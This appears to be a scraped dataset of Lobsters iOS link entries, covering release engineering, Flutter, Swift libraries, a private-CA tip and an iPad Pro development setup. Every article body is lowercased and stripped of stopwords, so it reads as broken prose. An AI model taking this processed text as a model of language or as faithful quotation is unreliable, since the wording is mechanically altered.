136,Lobsters,ios,Apple iOS,Mobile Release Engineering at Scale with Shipit Mobile,https://engineering.shopify.com/blogs/engineering/mobile-release-engineering-scale-shipit-mobile,mobile release engineering scale shipit mobile,continuous deployment web apps issue mobile release transferable solution shipit mobile existing tool releasing web apps creating new release shipit mobile trunkbased development testing building release candidate distributing app different channel google play official api fastlane apple app store connect api configuring shipit mobile convention configuration release captain useful notification emergency release rollout trust developer decision anka reliable ci system resilient test infrastructure flakiness mobile developer test apps engineering career page,one important phase software development releasing final user shopify invested heavily tooling continuous deployment web apps developer working web project want deploy change production process simple merge build container run ci ship production contrast uploading new version one mobile apps google play app store involved several manual step lot human interaction caused various problem wanted provide level convenience releasing mobile apps web apps also take opportunity define framework mobile team adopt reason developed new tool shipit mobile platform create view manage app release issue mobile release automatic deploys continuous delivery possible mobile several reason including approval wait time coordination developer designer product manager user need update app automatic update enabled finding several update app multiple time week even day annoyingmoreover new release deploy latest version code repository infrastructure thirdparty service app store involved software approval distribution owned mean update apps several time day even wanted touploading new version mobile apps google play app store fraught problem releasing new apps error prone due high number manual step involved like selecting commit release executing script upload binary store different team different process release mobile apps release process shared within organization process inconvenient complex team variant release script script complex untested release version build number managed manually finally lot responsibility burden release manager make decision fix bug found along way communicate stakeholder coordinate side task solution shipit mobile mobile release flow releasing new mobile app requires performing multiple step pick commit release increment build version number run ci manually test app qa iterate testing bug regression fixed update screenshots release note upload store wait app submission approved existing tool releasing web apps nt suitable mobile release process decided build something new shipit mobile shipit mobile home creating new release shipit mobile creating new release shipit mobile release start new branch repository follow trunkbased development approach release branch branched master opted trunkbased development instead release directly master branch reduces risk including code belong current release mistake new feature bug fix pushed branch release taking place release branch never merged back master branch bug fix pushed master cherrypicked release branch branching model branching model allows u automatically manage release branch avoid merge conflict release completed testing building release candidate release page shipit mobile new release created candidate built candidate shipit mobile corresponds releasable unit work every new commit release branch creates new candidate shipit mobile every candidate build number incremented new candidate trigger two continuous integration ci pipeline one test pipeline ensures app work expected pipeline build app release decided decouple two pipeline emergency want allow developer release app even test pipeline finished failed distributing app different channel distributing app different channel app built tested ci passing time upload store shipit mobile concept distribution channel distribution channel platform app downloaded release binary uploaded different channel useful want publish app google play send version app internally support team quickly access right version app support request come know app user downloaded storethe two main channel support google play app store google play used google play official api app store fastlane make easy upload io apps appstore connect use alongside apple app store connect api communicate app store upload apps metadata check apps approved ready release configuring shipit mobile every project release using shipit mobile need configuration file file tell shipit mobile basic information project platform channel want upload app optionally slack channel need notified state release went simple configuration favouring convention configuration seen way manage metadata release note screenshots app configuration file tell shipit mobile upload metadata app store know find upload long located expected folder release captain mobile release discrete process every release contains new feature bugfixes need person responsible making decision along way person release captainour previous release process complex role release captain easy transfer others moreover release captain communicate state release people involved itwith shipit mobile wanted make release captain role transferable made reality building platform guide release captain release process notify right people status release change easier others see charge release useful notification providing useful notification request got user since started work shipit mobile shipit mobile person charge release knew exact state responsible communicating others shipit mobile offload responsibility release captain sending notification slack channel every developer team know release status removing burden communicating status release stakeholder shipit mobile notification emergency release rollout shopify trust developer decision although strongly recommend passing ci creating release uploading app store mechanism place bypass restriction developer decide start release upload app store without waiting ci useful one service rely misbehaving status build received end day build tool make developer life easier get wayat shopify work infrastructure build better product quickly last year mobile tooling team spent time working scalable ci system android io pioneering use new technology like ankaalso worked providing reliable ci system resilient test infrastructure flakiness built tool top system improve mobile developer test appsdefining standard tool across mobile team bringing good practice convention make easier developer share knowledge jump project one goal mobile tooling team shipit mobile used production six month time changed evolved platform accommodate user need add new release channel improve user interface shown useful stable product developer trust release apps reduced complexity incurred mobile app release enabling u speed release cadence three week one week seen people take role release captain first time interested mobile tooling shopify production engineering team hiring love hear please take look open position engineering career page
137,Lobsters,ios,Apple iOS,Translating an ARM iOS app to Intel macOS using Bitcode,https://www.osnews.com/story/130038/translating-an-arm-ios-app-to-intel-macos-using-bitcode/,translating arm io app intel macos using bitcode,home mac o x translating arm io app intel macos using bitcode bitcode decided test theory author thomholwerda,home mac o x translating arm io app intel macos using bitcode translating arm io app intel macos using bitcode bitcode well bitcode small b architecturespecific intermediate representation used llvm capitalb bitcode pertains set feature allowing embed representation macho binary mechanism provide apple app store submission course specter macos arm public psyche many year many pondered whether bitcode make transition straightforward commonly held belief bitcode suited massive architectural change like moving intel armi unconvinced decided test theory steven troughtonsmith know going learn bargained author follow twitter thomholwerda
138,Lobsters,ios,Apple iOS,who killed videogames? (a ghost story),https://web.archive.org/web/20110926012139/http://insertcredit.com/2011/09/22/who-killed-videogames-a-ghost-story/,killed videogames ghost story,page action button entertainment,page killed videogames ghost story tim rogers figure one satan smaller men still talking engagement wheel look one said clicked next powerpoint slide men reacted uh like one best clicked one time prior engagement wheel resembled closeup snapshot brier patch one looked like something might see sticker side recycle bin particularly particular hippie commune engagement wheel today girl would one one day decide married larger man spoke gestured teach player play game one minute within one minute give ingame money make spend money buy investment begin earn profit build thing say thing finished five minute spend one premium currency unit happen one free premium currency unit game make use thing say wait three minute collect thing reason stick around three minute three minute tell come back half hour say done come back half hour phone sends push notification half hour right telling wait expressing importance patience never going forget way feel wait half hour playing game one minute going forget second time wait half hour third time forget first time wait four hour twentyfour hour start pay thing right first half hour get push notification phone vibrates tell suchandsuch ready collection men make sound collectively folded hand alongside alpine crystal spring superclear water bottle atop glass table collective face intent weirdly worried like man hearing beginning joke involving rabbi toddler lizard open app collect suchandsuch game tell leveled give bonus coin tell unlocked new thing fancier thing important part collect suchandsuch give maybe coin coin bonus get leveling coin magnitude collecting suchandsuch tell open store show new thing buy around coin leave couple collection worth maybe couple collection half worth coin purpose build new thing promising thousand coin per hour come back hour two hour three hour made enough cover initial investment buy upgrade coin thing make coin hour instead mathematical part brain see think double making everyone love number double control game world control number control ceiling doubling control player player almost hooked important give something give reason come back two half hour give ninety minute telling get coin per hour overall maybe got investment bringing coin per hour thing take twentyfour hour hook day hook two becomes tricky smaller men say hook two day difficult say whether hook three hook three say closing eye focusing pupil perhaps core head opening eye staring right going considering sticking around week stick around week larger man gold cufflink say find difficult conceive sticking around month three month concept occurred smaller man continues ready spend money show something say take three day build spend eleven ingame premiumcurrency unit right sell ingame premiumcurrency unit twenty dollar second buy twenty unit hooked least twenty larger man say say one older men say breaking long throaty silence man tell sitting head table playing action button entertainment ziggurat iphone designed game director team three people infinitely talented everything except math acting like jerk public meeting one going mention game though next one guy money going ask someone else toilet break drink lot green tea look awesome say designed game ask play die six time groan excitement upon death gradually escalating footballspectator volume sixth death hand iphone back casually touch fingertip forehead say want pause jumped back game say without trace irony monetization strategy used stand lot meeting try anymore genuinely took couple month realize talking thing stand talking time put white iphone sleep lay face board table fold hand say math math psychology might say economics clear throat economics philosophy might say modern video game design larger man praise blushing expert balancing thing construct algorithm shrewdly obscures downwardtrending curve ingame investment value saying smaller man say guy making thing people fathom playing three month play week going make thing people consider playing six month play three day generate mathematically proofable engagement wheel player come cute character listening anymore care probably going say player come cute character stay cruel mathematics
139,Lobsters,ios,Apple iOS,Spotify vs Apple: The Podcast War (Ep.2),https://growth.design/case-studies/spotify-vs-apple-podcast-ep2/,spotify v apple podcast war,,
140,Lobsters,ios,Apple iOS,Bringing Flutter to the Web,https://medium.com/flutter-io/bringing-flutter-to-the-web-904de05f0df0,bringing flutter web,bringing flutter web flutter ambition flutter web browser flutter web architecture flutter desktop effort flutterdevweb,bringing flutter webflutter portable ui framework building beautiful tailored experience support modern web pleased release technical preview sdk let take flutter ui code business logic run directly browserour ambition flutter web browserssince first beta last year customer using flutter create mobile apps run io android however flutter always architected portable ui toolkit among place run window mac fuchsia even raspberry pi since flutter built using dart includes productionquality compiler native machine code javascript solid foundation remaining challenge replace skiabased graphic engine text renderer webplatform equivalentsto right needed deliver fast jankfree framespersecond performance interactive graphicsconsistent behavior visuals flutter platformshighproductivity developer tooling integrates existing development patternssupport core web feature across modern browserswhile flutter web work progress plenty work area ready share preview try give u feedbackflutter web architecturethe overall architecture flutter web closely resembles flutter mobile flutter web architecturethe flutter framework green diagram shared mobile web offering provides highlevel abstraction ui foundation flutter including animation gesture base widget class well materialthemed set widget common application need already building flutter feel immediately home flutter webthe magic come translating concept browser reimplemented dart ui library replacing binding skia engine used mobile code target dom canvas compile flutter code web application flutter framework webflavored dart ui library written dart compiled javascript run modern browserflutter web demo running chrome firefox safariwe thoughtfully embracing core web feature like seamless integration browser history flutter routing model also coordinating flutter desktop effort enable mouse scrolling hover focus feature required mobile experiencesthe flutter web project focusing core value provided framework rich interactive experience web content focused document still benefit embedding flutter web visualizationsthe preview framework exists temporary fork existing flutter framework allowed engineer move quickly implement web functionality letting core team continue maintain improve productionready toolset already begun merge browser support main repository plan provide one flutter toolkit one framework power mobile web platformsour planned work includes support text feature selection copypastesupport plugins feature like location camera file access hope bridge mobile web single apioutofthebox support technology like progressive web appsunifying web development tooling existing flutter cli ide integrationdebugging web application using devtoolsimproved performance browser support accessibilitygo flutterdevweb find example documentation link resource excited see build
141,Lobsters,ios,Apple iOS,Don‚Äôt Pay the Early Adopter Tax,https://justinmayer.com/posts/early-adopter-tax/,pay early adopter tax,hardware guinea pig woe apple acknowledged problem new strategy want notified published new content,used early adopter always loved technological advancement computing consistently among first adopt latest hardware software early adopter terribly high cost fiscal cost although also often applies expensive term time frustration know people upgraded latest annual io release ended bricked device physically replaced others tried upgrade latest macos release got irrecoverably hung narrowly escaped unscathed back previous version operating system lucky enough avoid scenario like early adopter tendency certainly resulted fair share problem hardware guinea pig woe iphone announced stayed late preordered amazed arrived shipped directly shenzen factory doorstep day week followed chagrined find build quality issue problem antennarelated reception week followed apple almost certainly mitigated manufacturing issue silently folk bought phone month later blissfully unaware problem faced slow learn lesson preordered iphone launch day well le year later began experiencing sudden shutdown usually cooler weather even though battery still showed charge credit apple acknowledged problem replaced battery even warranty affected affected folk ordered phone launch day like waited kink get worked would likely another headache avoided new macbook pro touch bar announced nursing along macbook air year beyond ready upgrade highresolution retina display rationalizing away concern unnecessarily lowtravel keyboard questionable touch bar utility ordered new macbook pro launch day arrived experienced sticking key wakefromsleep problem video glitch thankfully everything except keyboard resolved subsequent software update still endure frustrating problem first month owned computer kind software upgrade least reasonable chance subsequent version fixing whatever problem created prematurely upgrading one nice thing software hardware manufacturer may may fix problem due cost scale involved hardware early adopter carry particularly high cost new strategy exception buy hardware launch day longer wait month two proverbial dust settle addition waiting manufacturing issue sorted extra time also allows read postlaunch review affords benefit making clearerheaded betterinformed purchase decision another recent change habit inclined buy proven battletested design iphone x announced waited bought iphone iphone x new screen face id shiny feature appeal ultimately decided firstgeneration component would le likely provide reliable troublefree experience touch id moreproven iphone design choice software side wait least several month upgrading latest annual macos release time period hundred hundred annoying bug fixed none ever affect plus use variety plugins custom extension take time updated compatibility major macos upgrade time upgrade latency increasing mojave nearly two year still little incentive upgrade high sierra catalina chance similarly hold major io upgrade least subsequent even release would probably wait even longer security update backported previous io version mention fact io upgrade oneway trip way revert apple virtually mandate upgrade via aggressive nag dialog topic another day remember tempted buy upgrade launch day consider high cost guinea pig wallet sanity thank want notified published new content
142,Lobsters,ios,Apple iOS,"flow9: a cross-platform modern UI for Web, iOS, Android, Windows, Mac, Linux",https://flow9.org/,crossplatform modern ui web io android window mac linux,welcome flow name blog flow github,welcome flow flow platform safe easy productive programming complex multiplatform apps modern user interface flow platform includes flow programming language safe functional stronglytyped programming language flowc compiler incremental compiler multiple target flow runtime standard library provides complete crossplatform library including mature ui component flow production quality target html io android window mac linux name flow started predates flow typechecker facebook thus elect keep name since came first full platform risk confusion seems small however need arise also used refer language blog april released flow github open source flow complete platform writing apps functional programming language run everywhere every day new programming language announced need one
143,Lobsters,ios,Apple iOS,Get the RSS feed url from an Apple Podcasts url using curl and jq,https://write.as/informative-jottings/get-the-rss-feed-url-from-an-apple-podcasts-url-using-curl-and-jq,get r feed url apple podcasts url using curl jq,get r feed url apple podcasts url using,get r feed url apple podcasts url using curl jqapril curl silent http itunesapplecomlookup id id jq r result feedurl work linux macos may need install jq id end http podcastsapplecom url example http id method known working year advanced oneline version using original url requires grep urlhttps curl silent http itunesapplecomlookup id echo url grep e jq r result feedurl
144,Lobsters,ios,Apple iOS,"square/Blueprint - declarative UI construction for iOS, written in Swift",https://github.com/square/Blueprint,squareblueprint declarative ui construction io written swift,blueprint declarative ui construction io written swift getting started swift package manager cocoapods documentation getting started hello world element hierarchy building custom element layout reference transition tutorial tutorial setup instruction using blueprint view controller building receipt layout blueprint adding blueprint existing project release instruction http,blueprint declarative ui construction io written swift blueprint greatly simplifies task building updating view application state change still consider blueprint experimental subject major breaking api change used within square production io apps let rootelement label text hello blueprint let view blueprintview element rootelement getting started swift package manager developing package sure blueprint included dependency packageswift dependency package url git githubcom squareblueprintgit xcode add blueprint directly dependency project file swift package add package dependency provide git url prompted git githubcom squareblueprintgit cocoapods use cocoapods manage dependency simply add blueprintui blueprintuicommoncontrols podfile pod blueprintui pod blueprintuicommoncontrols library blueprint provides architecture allows declaratively define ui hierarchy pure value swift structs enums display hierarchy within application update hierarchy application state change including animated transition use use blueprint time want display view hierarchy nt want manage view lifecycle hint managing view lifecycle large portion conventional uikit code time want manage view lifecycle complex animation transition good example case may want stick conventional approach interact uikit blueprint replacement uikit beginning blueprint designed compliment powerful tool come platform use blueprint manage display single view controller single view representing small part screen likewise straightforward host standard view control within blueprint hierarchy always leaving escape hatch documentation getting started hello world element hierarchy building custom element layout reference element blueprintview viewdescription transition tutorial tutorial setup instruction using blueprint view controller building receipt layout blueprint adding blueprint existing project two module provided blueprintui contains core architecture layout type blueprintuicommoncontrols includes element representing common uikit view control blueprint available via cocoapods add podfile integrate target mytarget pod blueprintui pod blueprintuicommoncontrols end release instruction copyright square inc licensed apache license version license may use file except compliance license may obtain copy license http unless required applicable law agreed writing software distributed license distributed basis without warranty condition kind either express implied see license specific language governing permission limitation license
145,Lobsters,ios,Apple iOS,There‚Äôs more to it,https://www.sicpers.info/2019/03/theres-more-to-it/,,labrary,saw apple latest medium event lot focus privacy run machine learning inference locally avoid uploading photo cloud though photo stream mean get sooner later anyway twitter stream frequently feature advert apple saying sell data course none company apple dig sell data either oldworld way understanding advertising unscrupulous magazine publisher may sold mailing list bulk mail sender day like postal service say know people deliver national geographic give u bulk mail make sure get best people addition national geographic looking kid comic past due demand royalty cheque postcard holiday destination course photo back developer truly break surveillance capitalism economy give control data apple merely give private phone hence focus going back analogy postal advertising apple offer secure po box service nobody know mail got surveillanceindustrial complex still know mail deliver box mail get picked go full thermonuclear war promised would need get application including web apps onto privacysupporting backend platform apple stopped selling xserve mac mini server mac pro server year ago mojave server longer contains well frankly longer contains server bit server solution tell server solution say use google cloud mean giving customer data surveillanceindustrial complex anticompetitive labrary run nextcloud file sharing contact calendar task etc host code gitlab run mail service work company take expertise core business mean know companyrelated data shared surveillanceindustrial complex anyway apple thermonuclear war surveillanceindustrial complex selling privacysupporting edge device small part overall problem support trilliondollar company seems like lot could interesting gap
146,Lobsters,ios,Apple iOS,I got node working on an iPhone thanks to the new JITless feature,https://twitter.com/theshawwn/status/1110691089009254400,got node working iphone thanks new jitless feature,,detected javascript disabled browser would like proceed legacy twitter yes
147,Lobsters,ios,Apple iOS,Swift/Cocoapod: Forget NSAttributedString and Use Prestyler,https://github.com/kruil/Prestyler/,swiftcocoapod forget nsattributedstring use prestyler,documentation requirement installation cocoapods carthage use predefined rule b strike underline custom rule prefilters working color thing need know example author monetalios license,prestyler text styling library based original nsattributedstring class simplifies extends original workflow giving clean short syntax find full documentation please check leave feedback prestyler allows replace code let basestring pain use attributed string io let attributedstring nsmutableattributedstring string basestring attribute nil let painword attributedstringstring nsstring range pain let attribute nsattributedstringkey nsattributedstringkeyfont uifontboldsystemfont ofsize nsattributedstringkeyunderlinestyle nsattributedstringkeyforegroundcolor uicolorred attributedstringsetattributes attribute range painword labelattributedtext attributedstring prestylerdefinerule prestylebold prestyleunderline uicolorred labelattributedtext prestyler everything prestyled requirement installation io xcode swift cocoapods dependency manager cocoa project install prestyler simply add following line podfile carthage decentralized dependency manager integrate prestyler xcode project specify cartfile github kruilprestyler use prestyler parse string applies defined rule give nsattributedstring result import prestyler labelattributedtext hello b bold b text prestyled also style text directly listing style labelattributedtext prestyler prestyledby style uicolorgreen defined rule prestylerdefinerule myrule uicolorgreen labelattributedtext text bold prestyledby rule myrule predefined rule several rule already defined b bold italic strike underline labelattributedtext italic text prestyled custom rule easy define simple rule prestylerdefinerule uicolorgreen labelattributedtext green text prestyled complex different style combination prestylerdefinerule bigyellowbold uicoloryellow prestylebold labelattributedtext bigyellowbold green bigyellowbold text prestyled define rule first parameter pattern search string format put list style define style use next class prestylebold italic strike underline precolor red precolor precolor random read color uifont uifontitalicsystemfont ofsize uicolor uicolorgreen string treated hex color int treated font size prefilters easy highlight number information usign prefilters par string insert provided tag used later styling available two method highlight number particular part text form used example filter need style prestylerdefinerule uicolorred let text highlight text number like text using prefilter par text embrace number ready go let prefilteredtext textprefilter type number prefilter text text labelattributedtext prefilteredtextprestyled working color several way manage color prestyler easiest one pas uicolor hex string style prestylerdefinerule colored uicoloryellow prestylerdefinerule colored prestylerdefinerule colored prestylerdefinerule colored color would applied foreground text color set background color use precolor class several interesting option prestylerdefinerule colored precolor uicoloryellow forbackgound prestylerdefinerule colored precolor forbackgound prestylerdefinerule colored precolor forbackgound precolor random percent int method allows get cool effect second color mixed random color prestylerdefinerule randomred precolor uicolorred random random prestylerdefinerule random precolor random thing need know nt put tag inside tag result unexpectable safe instead create new rule desired style define already existing style old one would replaced example run example project clone repo run pod install example directory first author ilium krupko use prestyler monetalios project license prestyler available mit license see license file info
148,Lobsters,ios,Apple iOS,iOS Development Pro Tip for Private CA Usage,https://christine.website/blog/ios-development-pro-tip-for-private-ca-2019-03-22,io development pro tip private ca usage,io development pro tip private ca usage http man middle attack ala superfish contact,io development pro tip private ca usage io order get http working cert private ca another step need user io newer statistically yes matter order ensure installed profile device open setting select general select profile ensure root ca name visible profile list like staticimgiosprofilespng go level general select select certificate trust setting root installed via profile listed heading enable full trust root certificate user toggle onoff trust root staticimgioscerttrustpng please understand user potentially vulnerable http man middle attack ala superfish please ensure appropriate measure place keep signing key ca safe hope help share mastodon article posted fact circumstance may changed since publication please contact jumping conclusion something seems wrong unclear
149,Lobsters,ios,Apple iOS,Using the iPad Pro as my development machine,https://arslan.io/2019/01/07/using-the-ipad-pro-as-my-development-machine/,using ipad pro development machine,using ipad pro development machine bret victor firstclass explore new possibility development blinksh blink ish coda workstation setup droplet packer terraform update july write idempotent bash script creating workstation tmux tmux session available create new one already session detach client attach secret mosh mosh file management connectivity cellular option algo usage hot screen size keyboard compatible keyboard ipad pro smart keyboard system wide option map cap lock ctrl pencil apple pencil usable taking note annotating screenshots editing picture creating diagram creating diagram face id interaction face id sensor placement accessory usbc apple watch magnetic charger usbc sd card usbc usb usbc lightning usbc adapter photo management photo privacy native io integration downloading original arq backup search suck sharing photo download original icloud sync continuity continuity handoff universal clipboard copy paste serious issue notable apps ulysses paper blink dash thing cost cost verdict fixmie know limit going hit wall stuff fatih,using ipad pro development machine january bought ipad pro use main development machine let say attempt huge fan bret victor try immerse idea paper video one thing talk look new medium unleash creativity create thing possible ipad different device know many people including using already many year however ipad improved lot two new way interaction firstclass citizen ipad ecosystem apple pencil apple smart keyboard think second touchscreen three different way creating something new left imagination number one reason bought ipad pro excellent powerful mobile device also wanted explore new possibility new input device new way creating stuff think apple onto something want see hold lengthy blog post first share experience using development machine script using whole workstation setup afterwards share review various bit using ipad pro photo file management keyboard pencil apps accessory etc grab coffee let deep dive development macbook pro belongs wife perfect excuse try new ipad pro experiment wanted see could test write deploy daytoday project possible let see first thing started install blinksh experimenting blinksh terminal emulator sandboxed local terminal access use basic stuff includes following command see ton stuff start using full featured o mean limited use however couple command useful ie scp show later blog post using conjunction io apps firing blink greets blank terminal shell prompt documentation obvious setting etc initially even experienced terminal user know started explore command found config command would open setting blinksh started digging setting go show important stuff need first create remote workstation start using main development machine obviously way develop ipad pro even sandboxed emulator useful project like ish emulation provides full linux shell syscall translation however still prototype mode started use yet something want check future also application like coda let edit develop html cs web developer need real terminal usable tool get job done let continue creating workstation workstation setup several option create remote workstation easiest way create vm instance say droplet digitalocean start using install couple package favorite programming language tool etc done however problem somehow lose machine data decided change cloud provider maybe decided start scratch let start history started first creating provisioning script used packer create image image would something would use start instance problem approach interaction development cycle image long suppose wanted add new packagetool final image change script create new image wait least minute depending network script see end result machine image useful want reuse thousand instance time need overkill remote workstation first iteration ditched image idea started using terraform dynamically provisioning droplet droplet creation would mean maintain store image would create droplet package provisioned issue approach figured using couple week point install new tool change configuration every time make sure also update provisioning script using terraform would mean create new remote workstation scratch reinstall tool point using provisioning script dedicated focused person even keep syncing host machine provisioning script right qmx finally talking friend use remote workstation already month thanks doug nan came conclusion using docker container inside instance update july using approach long time come conclusion using docker container come quirk issue init system inside docker creating temporary init system create personal user associated system easy treating container whole vm good idea container vm trying use updating docker image easy inside container updating image replacing existing container another problem exit container reexec want run new docker image container image immutable always adding new stuff becoming repetitive hassle deal additional layer docker container access working environment make sure update docker daemon runtime latest security fix prevent unwanted access stay uptodate problem abstraction running container nethost exposing network via host opening additional port firewall rule docker container ssh ing docker container come issue problem hence since last month ditched completely using docker container started using bare host simple provisioning script written bash beauty script idempotent context multiple execution script side effect system wrote write idempotent bash script blog post creating workstation create workstation run export digitaloceantoken put token terraform plan terraform apply autoapprove let give quick overview first using terraform create instance allows also setup additional resource firewall automatically configured based droplet terraform also make easy provision vm using simple bash script sophisticated tool chef ansible salt etc need use terraform course nice terraform script bootstrapsh script provision vm tool important package script idempotent mean update adding new package tool run without affecting overall state machine quite simple work feel free migrate advanced tool ansible chef etc like use outside ssh directly host via port also check firewall rule terraform file see port udp also open needed connect remote workstation via mosh instead ssh host created able ssh droplet mosh noinit root dropletip tmux newsession ad main explain tmux command mean bit note also ssh container want use mosh tmux huge fan tmux one thing definitely need knowlearn plan use ipad pro remote workstation small issue though somehow attach tmux session say ipad pro close lid attach container using different client say imac screen size resized big screen mean still seeing tmux window imac way tmux work used many share screen amongst multiple client however case care always one single client fix issue always detach ipad pro first could attach imac however cumbersome welcome magic command tmux newsession ad main command called every time connecting remote workstation basically session available create new one already session detach client attach learn individual flag please check tmux man jump newsession subcommand another fix done setup detach tmux single pane window tmux always using exit close tmux pane sometimes using ctlrd often problem habit last pane call exit exit tmux quits sometimes still something command line session alive fix added following script zshrc exit z tmux builtin exit return fi pane tmux listpanes wc l win tmux listwindows wc l count pane win count eq tmux detach else builtin exit fi script override exit command custom one follow quickly see getting number pane window detach one left otherwise always call exit secret one important part remote workstation part store secret easy task unfortunately check bootstrapsh file see nothing sensitive provisioned host however install op command line tool allows fetch retrieve secret account first mounting mntdevsecrets directory host provisioning also put script called pullsecretssh folder ssh host run following command cd mntdevsecrets pullsecretssh pullsecretssh script following content binbash set eu echo authenticating export opsessionmy op signin http ftharsln gmailcom outputraw echo pulling secret op get document githubrsa githubrsa op get document zshprivate zshprivate op get document zshhistory zshhistory rm f sshgithubrsa ln sfn pwd githubrsa sshgithubrsa chmod sshgithubrsa ln sfn pwd zshprivate zshprivate ln sfn pwd zshhistory zshhistory echo done authenticates account asking secret key master password downloading private key relevant file want keep sensitive symlink appropriate location even destroy start scratch file always mounted outside perfect course folder encrypted yet security expert still looking better way handling secret best solution could find end goal encrypted folder mount whenever ssh remote workstation asks password automatically decrypts folder symlinks relevant path please let know idea mosh said using mosh instead ssh blinksh come mosh support mean mosh client embedded able connect server moshserver installed go detail mosh really want share sentence landing page perfectly explains mosh replacement interactive ssh terminal robust responsive especially wifi cellular longdistance link always ssh camp using mosh couple week go back anymore using ssh always skeptical using mosh need ipad pro awesome cellular feature actually great fit believe connectivity first time felt like coding localhost still latency say server near region really fast another great feature alwayson connectivity feature give example insane let share something demoed friend setup wifi hotspot iphone connect ipad pro data plan yet ipad connect remote workstation via blink started running couple command closed lid ipad pro point connection gone already also turned iphone completely went turned iphone turned hotspot connect ipad pro voila still working like left magic know really feel like magic compared ssh exaggerate give try mean see mean see idempotent bash script bootstrapsh approach combined helper script additional tool mosh tmux make setup highly iterative develop secure easily maintainable far explained set remote workstation ipad pro let share experience using ipad pro context file management dealing file local machine much easier problem arises working remote machine copy back forth file especially era io ipad pro still perfect way dealing file several option install dropbox client dropbox great linux client work f easy install well installed easily move inout file use dropbox app ipad everything work seamlessly really liked approach file app ipad pro allows u interact blinksh using scp within blinksh app blink local storage use copy file host retrieve scp file app blink folder allows copypast file mean file inside file app theoretically copy anything remote host put file inside blink folder call following command hostname name define blinksh scp localfile hostname remotefile one issue scp command able pick port config need first ssh machine via command pick change ssh add esdsa scp recognize whereas add host known host rsa open issue course also copy remote machine local workstation well connectivity said earlier mosh make thing much easier change way use ipad pro even better constant connectivity optin buy ipad pro cellular option mean ipad pro dedicated data plan connect internet anywhere first time buying ipad cellular option always wanted try far think made excellent choice know could use iphone create personal wifi hotspot still experience could theoretically take ipad pro everywhere country instant connectivity wifi v cellular xkcd far great even use area public wifi really suck good enough cafe example also recent year cellular reception became better quality often switch also private algo vpn droplet mean secure fast connection whenever need one benefit remote workstation also network connectivity remote instance much faster local isp know pay ingressegress network data cloud provider pulling pushing docker image way better deal localhost pushing image around minute localhost took minute remote workstation unbelievable change perception working usage using ipad pro different sometimes use table writing couple line sometimes lay couch use top leg hold hand watching video reading book etc ipad pro comfortable mode doable say comfortable want use lap small weight wobble lot however say one great thing using lap get hot normally use macbook get warm couple hour depending work barely use stop case ipad pro feel different always expect warm screen size went using ipad many thing coding writing stuff main consumption device watching video reading book article interacting social medium etc hence always went smaller size friend feel like big comfortable hold hand think would pick one single machine home however imac pro user already powerful machine big screen therefore somehow need screen estate always optin imac definitely recommend see real decide size different think entirely depends feel comfortable using bigger screen ok use anything might case keyboard purchase compatible keyboard ipad pro called smart keyboard require battery attached directly via connector behind ipad pairing required well snap also automatically shuts close lid turn open lid unfold completely key also disabled great plan use pencil draw something want readwatch ipad writing blog post ulysses smart keyboard paper really great work also surprisingly well say perfect especially coding first esc key function row mean easy cancel anything say close modal change brightness screen always use touchscreen keyboard quality ok say sometimes better write keyboard macbook use esc lot nevertheless vim switch insert mode normal mode using either ctrlc shortcut jj custom mapping insert mode however problem begin use ctrl much cap lock mapped ctrl vim use ctrl lot think readline shortcut ctrle ctrla jump beginning end line way change cap lock ctrl system wide luckily blink option map cap lock ctrl visible useful blinksh even time detect pressed cap lock say perfect another issue approach constantly press cap lock exit blinksh know state cap lock either enabled start writing somewhere else disable cap lock time annoying could use external mechanical keyboard cap lock absent lose portability great feature smart keyboard lot application keyboard support twitter ulysses thing etc really good support example apple photo support keyboard delete photo scroll keyboard see app support kind shortcut press hold cmd key show modal shortcut use like macos use cmd space jump open anything work really great love hope apple continues improving state keyboard software wise io even better state constantly fight limitation point pencil like keyboard also buy apple pencil addition fundamentally different compared old version use older version pencil add much compare however one using latest iteration amazing feel like pencil way charge snap automatically bezel feel natural never care battery life pencil ready go whenever want use one thing clarify software engineer main area distributed system nothing job description drawing designing something might think get apple pencil well designing also usable taking note annotating screenshots editing picture creating diagram especially annotating picture one highlight using pencil want show something take screenshot immediately start annotating pencil amazing wonderful feel let quickly finish job secondly creating diagram pencil really great several application use really like paper wetransfer old diagram mode allows create diagram natural mode draw circle becomes perfect circle even connect shape together face id interaction new ipad pro us also face id important people use ipad pro keyboard make interaction everything much easier touch anymore unlock ipad secondly new password manager integration using login website convenient whenever see login page click password button face id unlocks login data pasted login form feel magical caveat face id sensor placement think face id camera placed little near button time holding ipad hand always cover camera make sure accidentally hover camera think apple made mistake putting face id camera current position place snap apple pencil bezel maybe minority user holding ipad always horizontally ipad keyboard also horizontal mode bad idea opinion accessory ipad pro usbc input instead lightning usbc introduced first new touchbar macbooks apple ecosystem course also removed port mean buy ton dongle carrying bag lot dongle fun imho bright side dongle cable work ipad pro well huge step enables ton new opportunity usbc dongle cable carry following dongle cable usbc apple watch magnetic charger needed charge apple watch unfortunately short used usbc charger intended used device ipad pro macbook usbc sd card perfect camera usb interface want import photo usbc usb used intercompatibility old device example fujifilm usbc output cable use usbc lightning charge iphone usbc adapter using bose bluetooth battery dy needed jack exists new ipad pro easily charge apple watch new apple watch magnetic charger usbc ipad pro really hated using usbc accessory macbook work laptop device could use ipad pro also us usbc everything much easier use looking forward iphone also switch usbc get rid cable start use usbc everything photo management like taking photo avid user fujifilm use lot one thing really love ipad pro easy manage photo edit first using apple photo store photo plan used dropbox google photo past eventually settled apple photo year ago benefit strong stance towards privacy sure photo used anything else consumer product native io integration everything work box uploadingdownloading photo interaction work without wait already apple ecosystem work really well backup photo continuously downloading original macos machine google photo allows download photo native application way sync photo back local whereas photo downloaded locally pair arq backup somewhere else said apple photo perfect two fundamental issue opinion search suck work well number photo increasing making harder find photo interested google photo comparison still best term searching sharing photo convenient google photo ability quickly share photo instantaneously whereas apple photo still really slow awkward use try share simple album photo see mean think problem eventually fixed upcoming version directly connect fuji ipad pro start importing photo back ipad pro bought version wanted ability quickly instantaneously edit see photo around worth photo perfect sense still using icloud sync photo idevices ipad imac enabled download original option allows edit photo manage photo easily lot photo want work big file think worth buying ipad bigger storage think perfect lot people would opt safer side able upgrade later icloud sync continuity think something worth mentioning apple ecosystem way icloud syncs setting file amazing think icloud dropbox replacement first whole idea moving seamlessly idevices iphone ipad imac macbook called continuity hood us icloud universal sync system make sure everything work fine using icloud mean note photo etc synced across device take photo iphoto boom ipad macbook immediately write something apple note available immediately device great thing especially like two thing work well one handoff one universal clipboard handoff enables start something one device later pick another device without losing focus example wrote blog post mainly ipad pro ulysses however sometimes jump back imac errand easily continue writing imac opening ulysses immediately ready used work many apps amazing example suppose browsing something imac grab ipad leave home open ipad boom second universal 